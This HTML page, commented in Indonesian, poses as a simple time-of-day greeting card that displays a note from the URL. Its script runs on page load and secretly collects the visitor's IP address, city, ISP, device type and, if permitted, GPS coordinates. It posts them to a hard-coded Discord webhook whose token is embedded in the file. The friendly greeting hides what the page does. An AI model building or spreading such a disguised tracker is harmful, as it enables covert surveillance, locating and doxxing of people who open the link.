<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;600;800&display=swap');

        :root { --bg: #121212; --primary: #00ff88; --txt: #f0f0f0; }

        body {
            background: var(--bg); color: var(--txt); font-family: 'Poppins', sans-serif;
            margin: 0; height: 100vh; display: flex; flex-direction: column;
            align-items: center; justify-content: center; text-align: center;
            overflow: hidden;
        }

        /* Desain estetik: Besar-Kecil vary */
        .greeting-box { padding: 20px; }
        
        .hi { font-size: 1.2rem; color: #666; font-weight: 300; letter-spacing: 2px; text-transform: uppercase; }
        .main { font-size: 3.5rem; font-weight: 800; line-height: 1.2; margin: 10px 0; }
        .note { 
            margin-top: 30px; font-size: 1rem; color: #888; 
            background: #1e1e1e; padding: 10px 20px; border-radius: 50px;
            border: 1px solid #333;
        }

        /* Loading ringan */
        .loader {
            position: fixed; bottom: 20px; right: 20px;
            width: 10px; height: 10px; background: var(--primary);
            border-radius: 50%; box-shadow: 0 0 10px var(--primary);
            opacity: 0; transition: opacity 0.5s;
        }
        .loader.active { opacity: 1; }
    </style>
</head>
<body>

    <div class="greeting-box">
        <div class="hi">Hi, Welcome</div>
        <div class="main" id="greetText"></div>
        <div class="note" id="noteText"></div>
    </div>

    <div class="loader" id="loader"></div>

    <script>
        // --- CONFIGURATION ---
        // PASTE WEBHOOK DISCORD ANDA DIBAWAH INI
        const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1513396133249024242/EZ8GI-vnWbW86C-aG8FLFa54nAj5ur-aTvZ5oLdqmQnj4lNlVbjgXXamrCLwLFZQcPst"; 

        // Ambil parameter dari URL
        const params = new URLSearchParams(window.location.search);
        const catetan = params.get('note');

        // Tampilkan greeting sesuai waktu
        const hour = new Date().getHours();
        const greet = hour < 12 ? "Good Morning" : hour < 18 ? "Good Afternoon" : "Good Evening";
        document.getElementById('greetText').innerText = greet + " :)";
        document.getElementById('noteText').innerText = catetan ? `📝 ${decodeURIComponent(catetan)}` : "";

        // --- FUNGSI KIRIM DATA + GEOLOCATION ---
        async function sendVisitorData() {
            document.getElementById('loader').classList.add('active');

            // 1. Ambil IP & Basic Info
            let ip = "Unknown", loc = "Unknown", isp = "Unknown";
            let lat = null, lon = null; // Koordinat

            try {
                const ipData = await fetch('https://ipapi.co/json/').then(r => r.json());
                ip = ipData.ip;
                loc = `${ipData.city}, ${ipData.region}, ${ipData.country}`;
                isp = ipData.org;
            } catch(e) { console.log("IP Error", e); }

            // 2. Coba Ambil GPS (Jika user izinkan)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (position) => {
                    lat = position.coords.latitude;
                    lon = position.coords.longitude;
                    // Kirim ulang dengan coords
                    await postToDiscord(ip, loc, isp, lat, lon);
                }, async (err) => {
                    // GPS error/denied, tetap kirim tanpa coords
                    await postToDiscord(ip, loc, isp, null, null);
                });
            } else {
                await postToDiscord(ip, loc, isp, null, null);
            }
        }

        async function postToDiscord(ip, loc, isp, lat, lon) {
            if(WEBHOOK_URL.includes("PASTE")) return;

            const waktu = new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta'});
            const device = navigator.userAgent.includes("Windows") ? "Windows" : 
                          navigator.userAgent.includes("Mac") ? "Mac" :
                          navigator.userAgent.includes("Android") ? "Android" : "Mobile";

            const coords = lat ? `\n📍 Koordinat: ${lat}, ${lon}` : "";
            const noteTxt = catetan ? `\n📝 Catatan: ${decodeURIComponent(catetan)}` : "";

            const payload = {
                content: `🎯 **NEW VISITOR**\n` +
                         `⏰ Waktu: ${waktu}\n` +
                         `🌍 IP: ${ip}\n` +
                         `🏢 Lokasi: ${loc} (ISP: ${isp})\n` +
                         `💻 Device: ${device}\n` +
                         coords + noteTxt
            };

            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(payload)
                });
            } catch(e) {}
            
            // Loader hilang
            setTimeout(() => document.getElementById('loader').classList.remove('active'), 1000);
        }

        // Jalankan saat halaman dimuat
        window.onload = sendVisitorData;
    </script>
</body>
</html>
